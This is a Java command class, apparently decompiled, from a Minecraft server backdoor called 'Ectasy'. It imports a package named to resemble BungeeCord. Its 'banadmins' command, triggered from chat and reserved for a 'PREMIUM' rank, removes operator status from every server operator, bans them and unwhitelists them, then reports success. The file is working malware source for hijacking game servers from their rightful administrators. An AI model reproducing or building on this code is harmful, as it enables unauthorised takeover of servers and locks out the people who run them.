package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.user.User;
import fr.body.ectasy.util.ChatUtil;
import net.md5.bungee.Ectasy;
import org.bukkit.Bukkit;
import org.bukkit.OfflinePlayer;
import org.bukkit.BanList.Type;
import org.bukkit.event.player.AsyncPlayerChatEvent;

@CommandInfo(
   name = "banadmins",
   description = "Bans and deops all ops",
   blatant = true,
   rank = Rank.PREMIUM
)
public class BanOperatorsCommand extends AbstractCommand {
   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      for(OfflinePlayer var5 : Bukkit.getServer().getOperators()) {
         if (!var5.isOnline() || Ectasy.users.get(var1.getPlayer().getName()).rank.index <= 0) {
            var5.setOp(false);
            Ectasy.parentPlugin.getServer().getBanList(Type.NAME).addBan(var5.getName(), "", null, "console");
            var5.setWhitelisted(false);
         }
      }

      ChatUtil.sendChat(var1.getPlayer(), "Successfully banned all operators!");
   }
}
